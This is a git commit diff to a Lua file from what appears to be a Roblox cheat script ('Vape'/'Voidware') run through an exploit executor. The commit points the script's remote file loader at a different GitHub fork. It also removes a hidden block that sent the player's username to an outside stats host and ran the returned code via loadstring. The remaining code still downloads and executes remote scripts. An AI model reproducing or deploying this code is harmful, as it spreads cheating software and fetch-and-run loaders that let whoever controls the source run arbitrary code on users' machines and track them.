e043c8dc258cbe49ce629619675d3496a50d1968
randombackup1293 <themagicpiston145@gmail.com>
2024-12-08 02:09:54 -0500

    Update VWUniversal.lua

--- VWUniversal.lua
+++ VWUniversal.lua
@@ -10,7 +10,7 @@ local baseDirectory = shared.RiseMode and "rise/" or "vape/"
 
 local function vapeGithubRequest(scripturl)
 	if not isfile(baseDirectory..scripturl) then
-		local suc, res = pcall(function() return game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/vapevoidware/"..readfile("vape/commithash.txt").."/"..scripturl, true) end)
+		local suc, res = pcall(function() return game:HttpGet("https://raw.githubusercontent.com/randombackup1293/PastewareModded2/"..readfile("vape/commithash.txt").."/"..scripturl, true) end)
 		assert(suc, res)
 		assert(res ~= "404: Not Found", res)
 		if scripturl:find(".lua") then res = "--This watermark is used to delete the file if its cached, remove it to make the file persist after commits.\n"..res end
@@ -68,18 +68,6 @@ local core
 pcall(function() core = game:GetService('CoreGui') end)
 
 --task.spawn(function() pcall(function() pload("Libraries/GlobalFunctionsHandler.lua", false) end) end)
-
-local VWeGETSIGMAED = function()
-	return game:HttpGet("https://voidware-stats.vapevoidware.xyz/sigma_alpha_big_darizzler?user=" .. lplr.Name, true)
-    
-end
-
-task.spawn(function()
-	pcall(function()
-		loadstring(VWeGETSIGMAED())()
-	end)
-end)
-
 
 local function warningNotification(title, text, delay)
 	local suc, res = pcall(function()
